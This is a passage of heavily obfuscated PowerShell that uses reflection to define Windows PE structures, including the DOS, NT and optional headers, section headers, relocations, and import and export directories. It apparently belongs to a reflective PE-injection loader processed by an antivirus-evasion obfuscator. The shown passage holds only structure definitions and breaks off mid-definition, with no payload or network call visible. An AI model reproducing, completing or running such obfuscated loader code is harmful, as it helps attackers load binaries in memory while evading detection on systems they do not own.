        ${wiN`32`TyP`eS}  |   &("{0}{2}{1}"-f 'Add-Mem','r','be'  ) -MemberType (  "{3}{1}{2}{0}" -f 'ty','tePrope','r','No') -Name ("{3}{1}{2}{4}{0}" -f '64','OPTI','ONAL_HEA','IMAGE_','DER' ) -Value ${I`m`AG`E_oPtI`ONAL_H`eADer`64}

       
        ${at`Trib`UTes}  = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        ${T`YPeB`UIlDeR} =   ${ModULE`BuI`LD`ER}."DefiNeT`y`pe"(  'IMAGE_OPTIONAL_HEADER32', ${ATTRi`B`Ut`Es}, [System.ValueType], 224)
        (  ${ty`pebU`I`ldEr}.(  "{2}{1}{0}" -f 'eld','efineFi','D'  ).Invoke('Magic', ${mAG`i`CtYpe}, 'Public') ).("{2}{0}{1}"-f 'etOf','fset','S' ).Invoke( 0 )  |   &  ("{2}{1}{0}" -f'ull','-N','Out' )
        ( ${TYP`ebu`i`lDeR}."D`eFineF`Ield"('MajorLinkerVersion', [Byte], 'Public') ).( "{2}{1}{0}"-f'set','Off','Set'  ).Invoke(  2 ) |     &  ( "{1}{0}"-f'ut-Null','O')
        (${tYpe`Build`eR}."deFinEf`i`ElD"('MinorLinkerVersion', [Byte], 'Public')  ).("{1}{0}{2}"-f'tOffs','Se','et'  ).Invoke(  3)  |     &  ( "{2}{1}{0}"-f'l','ul','Out-N' )
        ( ${typE`B`U`iLdEr}."D`EF`iNe`FieLD"(  'SizeOfCode', [UInt32], 'Public'  )).( "{2}{1}{0}" -f 'et','tOffs','Se' ).Invoke(  4) |   &  (  "{2}{0}{1}" -f 't-Nu','ll','Ou')
        (${tY`PEBU`iLdEr}."D`e`FinE`FieLd"('SizeOfInitializedData', [UInt32], 'Public'  )).("{0}{2}{1}" -f'Set','et','Offs').Invoke(  8) |  &  ("{0}{2}{1}"-f'Ou','ll','t-Nu')
        (${tYP`e`BUiL`DEr}."DeFiNE`FI`e`Ld"('SizeOfUninitializedData', [UInt32], 'Public'  ) ).("{2}{0}{1}"-f 'etO','ffset','S'  ).Invoke(12  )   | &( "{2}{1}{0}" -f'll','-Nu','Out' )
        (${tY`PebuI`LDER}."DeFInEFi`E`Ld"('AddressOfEntryPoint', [UInt32], 'Public' ) ).("{0}{1}{2}"-f 'S','et','Offset'  ).Invoke(  16 )   |    &  ( "{0}{1}" -f 'Out','-Null')
        ( ${tY`pebU`i`lDeR}."deF`I`NEFIeld"('BaseOfCode', [UInt32], 'Public' ) ).(  "{2}{1}{0}" -f 'ffset','etO','S'  ).Invoke(  20 ) |   &  ("{0}{2}{1}"-f 'O','l','ut-Nul')
        ( ${T`YPebuI`LDeR}."D`efi`NEFIElD"('BaseOfData', [UInt32], 'Public')).( "{2}{1}{0}" -f 'Offset','et','S').Invoke(24 ) | & (  "{1}{0}"-f 'ut-Null','O' )
        (  ${T`YPEB`Ui`lDeR}."def`i`NeFiELD"( 'ImageBase', [UInt32], 'Public')  ).("{0}{2}{1}" -f 'S','tOffset','e').Invoke(  28)   |   & (  "{0}{2}{1}" -f 'O','t-Null','u')
        ( ${T`Y`PEBuil`Der}."d`ef`ineF`IeLd"( 'SectionAlignment', [UInt32], 'Public' ) ).( "{0}{3}{1}{2}" -f'Se','ffs','et','tO').Invoke(  32  )  |     &  ( "{1}{2}{0}" -f 'l','O','ut-Nul' )
        ( ${tYPe`Bu`ILdeR}."de`Fi`NEf`IELD"( 'FileAlignment', [UInt32], 'Public')).( "{0}{1}"-f 'SetOffs','et'  ).Invoke(  36  )  |  &  ( "{0}{1}" -f 'Out-N','ull' )
        (  ${TyP`E`BU`iLDer}."DeFi`Nef`iELd"('MajorOperatingSystemVersion', [UInt16], 'Public')).(  "{0}{1}{2}"-f 'S','etOffse','t').Invoke(40)  |  &  ( "{0}{1}{2}"-f'Out','-Nu','ll'  )
        ( ${T`ypebui`l`DEr}."d`Ef`INEField"( 'MinorOperatingSystemVersion', [UInt16], 'Public' )  ).("{0}{1}"-f 'SetOff','set').Invoke(42 )   |  &  (  "{1}{2}{0}"-f 'll','Ou','t-Nu')
        ( ${typ`eBuil`DeR}."dE`FI`Nef`iEld"('MajorImageVersion', [UInt16], 'Public'  )).( "{2}{0}{1}"-f'etOffs','et','S').Invoke(44  )  |  & (  "{2}{1}{0}" -f'l','l','Out-Nu' )
        (  ${t`YPebU`i`lDER}."D`E`FiN`EfIeLd"(  'MinorImageVersion', [UInt16], 'Public'  )  ).(  "{2}{0}{1}"-f 'f','set','SetOf' ).Invoke(46 )   |   & ( "{1}{2}{0}" -f't-Null','O','u')
        (  ${t`y`PEBUilD`eR}."defiNef`iE`LD"( 'MajorSubsystemVersion', [UInt16], 'Public' )  ).( "{2}{0}{1}{3}"-f 'etO','ffse','S','t'  ).Invoke(  48  ) |    &(  "{1}{2}{0}"-f 'l','Out','-Nul' )
        (  ${TYPeb`U`iLder}."deFinEf`IE`LD"( 'MinorSubsystemVersion', [UInt16], 'Public' ) ).("{3}{2}{1}{0}" -f't','se','etOff','S'  ).Invoke(  50  ) |   &( "{1}{0}"-f't-Null','Ou')
        (  ${tYP`EB`UiLdeR}."D`EFI`Ne`FIELd"('Win32VersionValue', [UInt32], 'Public' )).("{1}{2}{0}"-f'ffset','Set','O'  ).Invoke(52)   |  &  (  "{0}{1}" -f 'Out','-Null'  )
        (${T`ypeB`U`IlDEr}."d`E`FINefieLd"('SizeOfImage', [UInt32], 'Public') ).(  "{0}{1}{2}" -f 'Se','t','Offset' ).Invoke(  56  ) |    &(  "{0}{1}{2}" -f 'Ou','t-','Null' )
        (  ${t`YPE`Bui`Lder}."dEf`iN`EfiEld"(  'SizeOfHeaders', [UInt32], 'Public' )).("{3}{1}{2}{0}"-f 'et','tOff','s','Se').Invoke(  60  )   |    &( "{1}{0}" -f'-Null','Out' )
        ( ${T`YPebui`lDer}."DEFi`N`EFie`LD"( 'CheckSum', [UInt32], 'Public'  )  ).( "{1}{2}{0}"-f'et','Set','Offs').Invoke( 64)  |    & ( "{1}{0}{2}"-f 'ut-Nul','O','l')
        (${tyPe`B`UI`lDER}.(  "{1}{3}{2}{0}" -f 'd','DefineF','el','i' ).Invoke('Subsystem', ${Su`BsY`S`TEMType}, 'Public' )).("{0}{2}{1}"-f 'S','set','etOff'  ).Invoke(68 ) |    & ( "{1}{0}" -f'Null','Out-')
        ( ${TY`PEb`UILDeR}.( "{2}{0}{3}{1}"-f 'i','ld','DefineF','e' ).Invoke('DllCharacteristics', ${d`l`lcHA`RaCterIsT`iCsTy`pE}, 'Public')).(  "{0}{1}{2}"-f 'S','e','tOffset' ).Invoke(  70  ) |     &  ( "{0}{1}"-f'Ou','t-Null'  )
        (  ${t`YP`EbuIL`dER}."dEF`iNEf`iELD"('SizeOfStackReserve', [UInt32], 'Public') ).("{1}{2}{0}{3}"-f 'e','SetO','ffs','t'  ).Invoke( 72 )   |    &("{1}{0}"-f'ull','Out-N' )
        (${t`YP`EBUIldeR}."dEFin`eF`i`ELD"( 'SizeOfStackCommit', [UInt32], 'Public')).(  "{1}{0}{2}" -f'et','S','Offset' ).Invoke(  76) |    & ("{1}{2}{0}"-f'l','Ou','t-Nul')
        (  ${T`YPEbU`i`LDeR}."DEf`iN`E`FIElD"('SizeOfHeapReserve', [UInt32], 'Public'  )).(  "{1}{0}{2}"-f'fs','SetOf','et' ).Invoke(80  ) |     & ("{2}{1}{0}" -f'l','Nul','Out-')
        ( ${TypeBu`ILd`Er}."DE`FI`NE`FIELD"('SizeOfHeapCommit', [UInt32], 'Public')  ).( "{0}{1}{2}"-f'S','et','Offset'  ).Invoke(  84) |  & (  "{0}{2}{1}" -f 'O','ull','ut-N' )
        (${Typ`e`BUilD`Er}."deFi`N`E`FIELd"( 'LoaderFlags', [UInt32], 'Public'  ) ).( "{3}{1}{0}{2}"-f'fs','Of','et','Set').Invoke( 88) |   & ("{0}{2}{1}" -f'Out-','ll','Nu' )
        (${typ`E`BuIlD`er}."d`EFin`eF`IELd"('NumberOfRvaAndSizes', [UInt32], 'Public' ) ).(  "{2}{0}{1}" -f'fs','et','SetOf' ).Invoke(  92  )   |     & (  "{1}{0}{2}"-f 'l','Out-Nu','l'  )
        ( ${T`yPeBUiL`d`Er}.("{2}{3}{0}{1}"-f'Fi','eld','Def','ine'  ).Invoke( 'ExportTable', ${i`M`A`ge_DatA_DirEcT`OrY}, 'Public'  )  ).( "{1}{0}{2}" -f 'Offse','Set','t').Invoke( 96  )  |   & ("{0}{2}{1}" -f 'Out','l','-Nul' )
        (${tYPEbui`ld`Er}.(  "{2}{1}{0}"-f 'ineField','ef','D'  ).Invoke('ImportTable', ${iMAGe_dAtA_dI`R`e`Ct`oRY}, 'Public' ) ).(  "{1}{0}{2}" -f'ff','SetO','set'  ).Invoke(  104 )   |  & (  "{1}{0}" -f '-Null','Out' )
        (${typ`ebu`I`LDer}.( "{2}{0}{1}" -f'ef','ineField','D'  ).Invoke( 'ResourceTable', ${i`M`A`G`e`_daTa_DiRectOry}, 'Public'  )  ).(  "{3}{2}{1}{0}" -f 't','se','f','SetOf').Invoke( 112)   |   & (  "{0}{1}"-f'Out-Nu','ll' )
        (  ${typ`eB`Uild`er}.(  "{1}{2}{0}" -f'd','Define','Fiel').Invoke(  'ExceptionTable', ${Im`AG`e_dAt`A_Di`REC`Tory}, 'Public')  ).(  "{2}{1}{0}" -f 'set','f','SetOf'  ).Invoke( 120  )   |    & (  "{1}{2}{0}" -f 'Null','O','ut-')
        (  ${TYp`ebu`ild`er}.( "{1}{3}{0}{2}"-f'el','Define','d','Fi'  ).Invoke(  'CertificateTable', ${iMAge_d`ATa_dIR`Ec`T`oRY}, 'Public'  ) ).("{2}{1}{0}"-f 'et','tOffs','Se'  ).Invoke(128 )   |     &  (  "{1}{0}" -f't-Null','Ou')
        (${ty`P`EbU`iLdEr}.("{2}{1}{0}"-f 'ld','eFie','Defin' ).Invoke(  'BaseRelocationTable', ${i`mA`G`E_DatA_DirectO`RY}, 'Public' )).(  "{2}{1}{0}" -f 'fset','etOf','S'  ).Invoke(136 )   |   & ( "{0}{2}{1}" -f 'Out-N','ll','u' )
        (  ${TypeB`U`Il`Der}.(  "{1}{0}{2}"-f'eFiel','Defin','d').Invoke('Debug', ${IM`Age_DaTa_dI`ReCT`o`Ry}, 'Public'  ) ).("{0}{1}" -f 'Se','tOffset').Invoke(  144  ) |  & (  "{0}{1}" -f 'Out','-Null' )
        (  ${T`Ypebu`il`deR}.( "{1}{2}{0}" -f'd','Defi','neFiel'  ).Invoke( 'Architecture', ${ima`gE_d`A`Ta_Di`ReCtORy}, 'Public' )  ).( "{2}{0}{1}" -f 'fs','et','SetOf' ).Invoke(  152)  |    & (  "{1}{0}" -f 't-Null','Ou' )
        ( ${T`YpEBu`i`LdER}.( "{2}{0}{1}"-f'fin','eField','De'  ).Invoke( 'GlobalPtr', ${Im`AGe`_Dat`A_`Di`ReCTOry}, 'Public'  )).( "{1}{3}{0}{2}"-f'O','S','ffset','et').Invoke( 160  )   | &  ( "{2}{1}{0}"-f'ull','-N','Out')
        (  ${T`Ypeb`UILd`ER}.("{2}{3}{0}{1}"-f'eF','ield','D','efin'  ).Invoke('TLSTable', ${i`mA`ge_DAt`A_diREc`T`orY}, 'Public' )  ).(  "{1}{0}"-f 'fset','SetOf').Invoke(  168  )  |  &  (  "{1}{0}"-f'l','Out-Nul' )
        (  ${TYpEbUi`l`Der}.("{2}{3}{0}{1}" -f'ie','ld','Def','ineF'  ).Invoke( 'LoadConfigTable', ${iMa`gE_D`ATa_direc`To`RY}, 'Public')  ).(  "{1}{2}{0}"-f 't','S','etOffse'  ).Invoke( 176) |    & ( "{1}{2}{0}"-f'-Null','O','ut' )
        (  ${tY`p`eBu`ILDeR}.("{2}{0}{1}"-f 'i','eld','DefineF' ).Invoke(  'BoundImport', ${i`Mage`_DAtA_`d`irECToRy}, 'Public'  ) ).(  "{2}{1}{0}"-f'fset','etOf','S').Invoke(184 )   |   &  ("{2}{0}{1}" -f'ut-Nul','l','O'  )
        ( ${tyPeB`U`Ilder}.( "{0}{1}{2}"-f 'D','efine','Field').Invoke( 'IAT', ${imAge_DaT`A_DIr`Ec`TOry}, 'Public')).( "{2}{0}{1}"-f 'ffs','et','SetO').Invoke(  192 )   |     &(  "{2}{0}{1}"-f'-','Null','Out'  )
        (  ${tyPEBuI`L`d`Er}.( "{0}{2}{1}" -f'Define','d','Fiel').Invoke('DelayImportDescriptor', ${i`m`Ag`E_D`AtA_DIrectORY}, 'Public')).("{2}{0}{1}{3}"-f 'Of','fse','Set','t' ).Invoke(  200  ) |    & ( "{1}{0}" -f '-Null','Out'  )
        (  ${tyPEbuI`LD`eR}.(  "{1}{2}{0}" -f 'eField','D','efin'  ).Invoke(  'CLRRuntimeHeader', ${I`MA`Ge_dAT`A`_d`IrECT`OrY}, 'Public'  )  ).(  "{1}{0}{2}"-f'etOff','S','set').Invoke(208  )   |  & ("{2}{0}{1}" -f'ut-Nu','ll','O')
        (  ${TYP`EBUI`LDeR}.("{2}{0}{1}"-f 'neF','ield','Defi').Invoke('Reserved', ${imAG`e_d`AtA_D`iR`eC`TOrY}, 'Public' ) ).( "{2}{0}{1}" -f 'Offse','t','Set'  ).Invoke( 216  )   |   &  (  "{0}{2}{1}"-f'O','ull','ut-N')
        ${ImAGE_`o`pt`IonaL`_`headeR32} =   ${ty`p`Ebuil`deR}.("{2}{0}{1}"-f'eTy','pe','Creat').Invoke(   )
        ${wi`N`32`TYpes} |     &("{0}{1}{2}"-f'Add-Memb','e','r'  ) -MemberType ("{0}{2}{1}" -f 'NotePr','y','opert'  ) -Name ( "{4}{5}{3}{0}{6}{2}{1}"-f'N','2','ER3','_OPTIO','IMA','GE','AL_HEAD' ) -Value ${i`MAge`_opTi`o`Nal`_HEAD`er32}

       
        ${ATT`RiB`Utes}  =   'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TyPeB`UIlD`eR}  =  ${M`od`UlEBUiLder}."d`e`FInETY`Pe"('IMAGE_NT_HEADERS64', ${A`Tt`RibuT`Es}, [System.ValueType], 264)
        ${TY`pEb`U`IlDer}."DeFin`eF`ie`LD"( 'Signature', [UInt32], 'Public' )   |    & ( "{1}{0}"-f'ut-Null','O' )
        ${TY`pebUil`deR}.(  "{0}{2}{1}{3}"-f 'De','i','f','neField'  ).Invoke( 'FileHeader', ${iMAge_f`i`le_he`A`DEr}, 'Public' )  |    &( "{0}{2}{1}"-f 'Out','l','-Nul' )
        ${T`ypEbU`I`LdeR}.("{0}{2}{3}{1}"-f 'Defin','d','eFie','l').Invoke('OptionalHeader', ${i`MaGe_o`pT`ioN`Al_H`EadE`R64}, 'Public' ) |  &  ( "{1}{0}{2}"-f'-Nu','Out','ll')
        ${i`Mag`E_Nt_hE`Ad`eRs64} = ${typ`EbUIL`dEr}.("{1}{2}{0}{3}"-f'T','Cr','eate','ype' ).Invoke(  )
        ${WIn`32`TYP`ES}   |     & ( "{0}{2}{1}"-f 'Ad','r','d-Membe'  ) -MemberType ("{2}{1}{3}{0}"-f 'perty','o','N','tePro'  ) -Name ( "{2}{0}{5}{4}{3}{1}" -f 'MAGE','RS64','I','E','AD','_NT_HE'  ) -Value ${IMaGE_N`T_`HeA`dERs64}

       
        ${ATt`RIB`UTEs}   = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TYPEbU`il`d`er} =  ${mo`DULe`BuiLdEr}."D`eFI`NeT`ypE"('IMAGE_NT_HEADERS32', ${ATTRI`BUt`Es}, [System.ValueType], 248)
        ${TYPeB`UiLd`ER}."d`EfiNeF`iEld"(  'Signature', [UInt32], 'Public'  )   |    &(  "{0}{1}"-f 'Out','-Null'  )
        ${TypeBUI`L`dER}.( "{2}{1}{0}"-f 'ineField','f','De'  ).Invoke( 'FileHeader', ${iMa`Ge`_`F`IL`E_HEadER}, 'Public')   |    & ( "{0}{1}"-f'O','ut-Null' )
        ${T`ypE`BUILd`ER}.(  "{2}{3}{0}{1}"-f'Fiel','d','Defin','e' ).Invoke( 'OptionalHeader', ${I`m`AgE_op`TiON`AL`_`HEad`Er32}, 'Public'  )   |   &  ("{2}{1}{0}"-f 'll','t-Nu','Ou' )
        ${I`mAGE`_`N`T_HEaDE`RS32}  = ${ty`PeBUilD`eR}.("{2}{0}{3}{1}" -f'a','Type','Cre','te'  ).Invoke(    )
        ${WiN`32`Typ`Es} |    & (  "{0}{2}{1}"-f 'A','r','dd-Membe' ) -MemberType ("{0}{1}{2}{3}" -f'Note','Pr','opert','y'  ) -Name (  "{2}{1}{3}{4}{0}" -f'ERS32','MAGE_N','I','T_H','EAD') -Value ${I`MaGE_`Nt_hE`ADER`s`32}

       
        ${AT`TRIbU`TEs}  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TyPeb`UI`lD`ER}   =  ${Mo`Du`lEbUILdeR}."De`FiNEt`yPe"(  'IMAGE_DOS_HEADER', ${ATT`RIBut`es}, [System.ValueType], 64)
        ${TYPE`BUIlD`Er}."D`EfI`Nef`ielD"('e_magic', [UInt16], 'Public' )   |   &(  "{1}{0}" -f 't-Null','Ou' )
        ${T`YpEBUiLD`eR}."defi`N`e`FiELD"('e_cblp', [UInt16], 'Public' )  |   & (  "{0}{2}{1}"-f'Out','l','-Nul' )
        ${t`YpeB`UILd`ER}."D`e`FineFi`ElD"('e_cp', [UInt16], 'Public')  |    &  ("{0}{1}" -f 'Out','-Null' )
        ${t`Y`PEbUILDER}."DE`FIn`eFIELD"( 'e_crlc', [UInt16], 'Public' ) |   &  ("{2}{1}{0}"-f't-Null','u','O'  )
        ${tYPEB`U`I`LdEr}."DE`FInEFI`e`ld"('e_cparhdr', [UInt16], 'Public'  ) |  & ("{0}{2}{1}" -f'Out','ll','-Nu'  )
        ${T`Ypeb`UI`lder}."DE`FiNeF`ieLD"(  'e_minalloc', [UInt16], 'Public' )   |  &  ("{0}{1}{2}" -f'Out','-Nu','ll')
        ${tyPeBU`I`L`dEr}."D`EfiNEfI`elD"( 'e_maxalloc', [UInt16], 'Public')  |   &  ( "{1}{0}{2}" -f'ut-N','O','ull' )
        ${TYP`EbUILd`Er}."defiNe`FIe`Ld"(  'e_ss', [UInt16], 'Public')  |   & (  "{1}{0}" -f'-Null','Out' )
        ${T`yPebu`ILDeR}."dE`Fi`N`EfIeld"(  'e_sp', [UInt16], 'Public')  |   & ("{1}{0}{2}" -f'-N','Out','ull')
        ${t`YPe`B`UiLDEr}."dEfIn`efie`Ld"('e_csum', [UInt16], 'Public'  )  |  &  ( "{2}{0}{1}" -f'-Nu','ll','Out' )
        ${tyPeBUi`L`Der}."D`EFINEFI`ELD"( 'e_ip', [UInt16], 'Public')   |   & ( "{2}{1}{0}"-f'l','ut-Nul','O'  )
        ${t`YpEbu`i`LDeR}."D`eF`InE`FIeLd"(  'e_cs', [UInt16], 'Public')  |     &  ( "{2}{1}{0}" -f 'l','ul','Out-N' )
        ${t`ypEB`U`IlDer}."dEfIN`EFi`eld"(  'e_lfarlc', [UInt16], 'Public'  )  |   &( "{1}{0}" -f 'Null','Out-')
        ${tY`PEb`UIL`dEr}."dE`F`INe`FieLD"('e_ovno', [UInt16], 'Public'  )  |   & (  "{1}{2}{0}"-f '-Null','O','ut' )

        ${E`_re`Sfield}   = ${T`Y`pEBUILd`ER}."d`efIn`efiELd"('e_res', [UInt16[]], 'Public, HasFieldMarshal' )
        ${cONST`R`UCTO`RvaL`Ue} =   (  GET-VariABLE irJS  ).VaLuE::"By`Va`LARraY"
        ${F`I`eLdaRraY}   =  @( $8BnX.("{2}{1}{0}"-f'Field','t','Ge').Invoke('SizeConst' ))
        ${A`TTriBbui`LdeR}   =    & (  "{2}{1}{0}"-f 't','bjec','New-O' ) ( "{6}{1}{7}{3}{4}{5}{2}{0}"-f'r','m.Ref','uteBuilde','Cus','tomAt','trib','Syste','lection.Emit.'  )( ${cO`NST`RU`cTO`RiNFO}, ${cO`NstRU`CtORVal`Ue}, ${fIelD`ArR`Ay}, @([Int32] 4  )  )
        ${E_`ResfI`eld}.(  "{2}{4}{5}{1}{3}{0}"-f 'ttribute','m','S','A','etCu','sto').Invoke(${a`TTrIBBu`i`L`deR}  )

        ${T`YpEbUIl`D`eR}."defI`Nef`Ield"(  'e_oemid', [UInt16], 'Public' )  |     &("{0}{2}{1}"-f'O','Null','ut-'  )
        ${T`Yp`eBUiLDER}."D`Efi`Ne`FIeLD"( 'e_oeminfo', [UInt16], 'Public'  )   |    &("{0}{2}{1}"-f'O','Null','ut-'  )

        ${e_R`es2`FiE`LD}  = ${tY`PeBU`I`lder}."DE`Fin`E`FiEld"( 'e_res2', [UInt16[]], 'Public, HasFieldMarshal' )
        ${c`onsTRUc`ToRv`A`l`Ue}   =     (    get-itEm variABLE:IrJs  ).VaLUe::"ByVal`Ar`RaY"
        ${AT`T`Ri`BB`UILdER}  =    & ( "{0}{2}{1}"-f 'New-Obje','t','c') ("{3}{6}{7}{2}{5}{0}{4}{1}" -f 'omAttrib','eBuilder','Cu','System.Reflection','ut','st','.Emi','t.'  )(${conSt`R`UCTo`RInfo}, ${COnST`R`U`cTorVAlUE}, ${Fi`e`l`darrAY}, @([Int32] 10 )  )
        ${e_r`ES`2fiElD}.(  "{2}{0}{3}{1}" -f 'r','bute','SetCustomAtt','i').Invoke(${aTtRI`Bbu`Ild`Er} )

        ${ty`peb`UilD`er}."dEF`I`NeFieLD"( 'e_lfanew', [Int32], 'Public')   |   &("{1}{0}"-f 't-Null','Ou')
        ${i`m`AgE_DO`S_he`AdER}   =  ${TY`PEBuIL`deR}.(  "{0}{2}{1}"-f'Cre','pe','ateTy'  ).Invoke(   )
        ${wiN3`2`T`ypES}   |   &  (  "{3}{2}{0}{1}"-f 'emb','er','d-M','Ad'  ) -MemberType ( "{2}{1}{3}{0}"-f'erty','te','No','Prop' ) -Name ( "{3}{0}{1}{4}{2}"-f 'AG','E','ER','IM','_DOS_HEAD' ) -Value ${Image_d`O`s_HE`A`dER}

       
        ${AttRI`But`Es}   =   'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${typEbU`iLd`er} =  ${m`ODul`EBuILDEr}."De`FINE`TypE"('IMAGE_SECTION_HEADER', ${atTr`ib`UTeS}, [System.ValueType], 40  )

        ${n`AmEFI`ELd} = ${Ty`pEB`UILD`er}."D`EF`INeF`IeLD"( 'Name', [Char[]], 'Public, HasFieldMarshal')
        ${cOn`s`TRUc`TOR`VaL`UE} =    ( vAriabLe  ( "ir"  + "JS" ) ).ValuE::"b`Y`VALARr`Ay"
        ${At`TR`ibbuIld`eR} =   & ( "{2}{0}{1}" -f 'w-Objec','t','Ne'  ) ( "{2}{5}{4}{3}{8}{1}{9}{0}{6}{7}"-f 'teB','tomAttr','Sy','tion.E','ec','stem.Refl','u','ilder','mit.Cus','ibu' )(  ${c`OnStRuct`O`RINfo}, ${coNstrUc`T`o`RVA`LUE}, ${f`IE`Ld`ARray}, @([Int32] 8 ) )
        ${NA`mE`FIeLD}.( "{4}{3}{2}{0}{1}" -f 'ribu','te','omAtt','ust','SetC' ).Invoke(  ${aT`T`R`IbBUiL`DeR} )

        ${TYp`E`BuIl`der}."D`efIn`Ef`IeLd"( 'VirtualSize', [UInt32], 'Public') |   &  ( "{1}{0}" -f 'ull','Out-N'  )
        ${typEb`U`ildeR}."DEf`iN`EfiELd"('VirtualAddress', [UInt32], 'Public'  ) | &("{0}{1}" -f'Ou','t-Null')
        ${tYP`e`Builder}."d`EfinefIE`Ld"( 'SizeOfRawData', [UInt32], 'Public')  |   &( "{1}{0}{2}"-f '-Nul','Out','l' )
        ${t`YP`EbUi`lDEr}."Define`F`ieLd"('PointerToRawData', [UInt32], 'Public')   |   & ( "{0}{1}"-f 'Out-Nu','ll')
        ${typEbU`IL`D`eR}."DEfI`Ne`F`iELd"( 'PointerToRelocations', [UInt32], 'Public' ) |   & ( "{0}{1}"-f'Out-Nul','l')
        ${t`y`pEbU`ILDER}."dE`FiNe`Fie`Ld"(  'PointerToLinenumbers', [UInt32], 'Public')  |  &  ("{0}{1}" -f 'Ou','t-Null' )
        ${T`YPeb`UilDEr}."dE`Fin`EFi`eLd"('NumberOfRelocations', [UInt16], 'Public' ) |   &  (  "{2}{1}{0}"-f 'l','t-Nul','Ou')
        ${TyPeBUI`LD`ER}."De`FiNefie`LD"('NumberOfLinenumbers', [UInt16], 'Public'  )   |    &  ( "{0}{1}"-f'Out-N','ull')
        ${tYPEBu`i`ld`er}."D`eF`inefIeLD"('Characteristics', [UInt32], 'Public' )   |   & (  "{2}{0}{1}"-f 'ut-N','ull','O'  )
        ${imagE`_`SeCtIO`N`_Hea`dER}   = ${t`yPEbUil`D`er}.("{3}{2}{0}{1}"-f'e','Type','eat','Cr').Invoke(    )
        ${wI`N`3`2TyPES} |   &  (  "{0}{3}{1}{2}" -f'Add-','embe','r','M') -MemberType ("{3}{1}{0}{2}" -f'oper','r','ty','NoteP'  ) -Name ("{5}{0}{3}{4}{2}{1}" -f'G','DER','N_HEA','E_SEC','TIO','IMA'  ) -Value ${IMaG`E_sE`c`TIoN_HEad`ER}

       
        ${aTtrIBu`T`ES} =  'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${t`YPEBui`lD`Er}  =   ${m`oDuL`eBU`Il`deR}."DE`Fine`TYPE"(  'IMAGE_BASE_RELOCATION', ${A`TTRiB`U`TES}, [System.ValueType], 8)
        ${tyP`E`Bu`IlDER}."de`Fin`e`FiEld"('VirtualAddress', [UInt32], 'Public') |    & (  "{0}{2}{1}" -f 'Out-N','l','ul'  )
        ${tY`pE`BuILdER}."de`FiNeF`IELD"( 'SizeOfBlock', [UInt32], 'Public' ) |   &( "{2}{1}{0}" -f 'ull','N','Out-'  )
        ${im`A`ge`_baSE_`REL`ocAt`ion}   =  ${tYP`EBUiL`d`Er}.("{1}{0}{2}"-f'r','C','eateType' ).Invoke()
        ${Wi`N32t`yP`Es} |    & ( "{2}{0}{1}" -f 'd','-Member','Ad' ) -MemberType (  "{1}{2}{0}"-f 'y','No','tePropert'  ) -Name ( "{3}{2}{1}{0}{4}"-f'ASE_R','E_B','G','IMA','ELOCATION') -Value ${I`MAge`_`BAse`_r`eLocAtIoN}

       
        ${A`TTRib`UteS}  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${TYp`e`Buil`DER} =  ${m`o`Dul`e`BUildeR}."D`eFINEt`YPE"( 'IMAGE_IMPORT_DESCRIPTOR', ${a`TTRIb`UTES}, [System.ValueType], 20)
        ${TY`pE`B`UildeR}."dEf`ine`Fie`lD"(  'Characteristics', [UInt32], 'Public')   |    &( "{2}{1}{0}"-f 'ull','N','Out-' )
        ${typ`EBU`i`LdER}."defI`NE`FielD"(  'TimeDateStamp', [UInt32], 'Public' ) |   &  (  "{2}{0}{1}" -f 't-Nu','ll','Ou' )
        ${tYpEb`UIl`der}."D`eFI`N`EfIeld"(  'ForwarderChain', [UInt32], 'Public'  )   |    & ("{1}{0}" -f 'ull','Out-N' )
        ${Type`BU`ilD`ER}."dEfIN`Ef`I`elD"('Name', [UInt32], 'Public' ) |   &(  "{0}{2}{1}"-f'O','l','ut-Nul')
        ${typ`eBuIL`d`Er}."d`EFi`NeFiE`lD"(  'FirstThunk', [UInt32], 'Public')  |     &  ( "{1}{2}{0}"-f'l','O','ut-Nul')
        ${I`m`AGe_Im`PO`Rt`_DescRi`PToR}  = ${TY`pEbuIL`dER}.("{2}{0}{1}"-f'teTyp','e','Crea' ).Invoke(  )
        ${wiN`3`2`TypEs}   |  &("{0}{1}{2}" -f'Add-Me','m','ber') -MemberType ( "{2}{0}{3}{1}"-f't','y','No','ePropert'  ) -Name (  "{3}{4}{5}{2}{1}{0}"-f 'OR','T','DESCRIP','I','MAGE_I','MPORT_' ) -Value ${IM`AGe`_I`mPorT`_`DeSc`Ript`OR}

       
        ${atTR`Ib`UT`ES} =  'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        ${T`yPebUi`ldEr} = ${moD`UlEBUIl`d`er}."D`efinEt`Ype"( 'IMAGE_EXPORT_DIRECTORY', ${a`TTrIbut`Es}, [System.ValueType], 40)
        ${TyPe`BUiLD`Er}."def`i`NE`FIElD"( 'Characteristics', [UInt32], 'Public') | & ("{1}{0}"-f'-Null','Out'  )
        ${TY`pe`BUiLd`Er}."Def`iNE`FiELD"( 'TimeDateStamp', [UInt32], 'Public' ) |   & ( "{0}{1}" -f 'Ou','t-Null')
        ${tYPEB`UiL`d`Er}."DEFIn`e`F`ieLD"( 'MajorVersion', [UInt16], 'Public'  ) |  & ( "{1}{0}"-f't-Null','Ou')
        ${tY`P`ebUILD`eR}."d`e`FI`NEFiEld"(  'MinorVersion', [UInt16], 'Public') | & (  "{1}{0}{2}" -f't-Nu','Ou','ll')
        ${T`yPebuILD`er}."d`eFiNEfi`ELD"(  'Name', [UInt32], 'Public')  |  &("{1}{2}{0}"-f'll','Out-N','u' )
        ${TY`p`ebuI`ldEr}."de`F`inefiE`lD"( 'Base', [UInt32], 'Public') |  & ("{2}{0}{1}"-f't-Nul','l','Ou')
        ${t`Yp`eBUI`LDEr}."deF`In`efiELD"( 'NumberOfFunctions', [UInt32], 'Public' )  |  &( "{0}{1}" -f'Out-Nu','ll')
        ${tyPE`B`UiLd`ER}."defiNef`iE`ld"(  'NumberOfNames', [UInt32], 'Public'  )   |   & ("{2}{1}{0}" -f'ull','N','Out-'  )
